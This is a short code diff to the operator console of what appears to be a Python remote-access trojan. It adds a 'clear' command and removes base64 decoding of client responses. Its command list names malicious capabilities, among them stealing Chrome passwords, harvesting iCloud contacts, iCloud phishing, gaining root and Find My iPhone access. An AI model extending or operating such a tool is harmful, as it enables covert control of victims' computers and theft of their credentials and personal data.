@@ -4,7 +4,6 @@ import socket
 import ssl
 import thread
 import os
-import base64
 import struct
 
 BANNER = '''\
@@ -20,7 +19,7 @@ MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
-commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
+commands = ["help", "status", "clients", "connect", "clear", "get_info", "get_root", "get_computer_name",
             "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "kill_client"]
 status_messages = []
 
@@ -198,6 +197,8 @@ if __name__ == '__main__':
                         current_client_id = specified_id
                     except (IndexError, ValueError) as ex:
                         print MESSAGE_ATTENTION + "Invalid client ID (see \"clients\")."
+                elif command == "clear":
+                    os.system("clear")
                 else:
                     # Commands that require an active connection
                     if current_client_id is None:
@@ -279,7 +280,7 @@ if __name__ == '__main__':
                 if current_client_id is None:
                     print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                 else:
-                    response = base64.b64decode(send_command(connections[current_client_id], command))
+                    response = send_command(connections[current_client_id], command)
 
                     if command.startswith("cd"):  # Commands that have no output.
                         pass
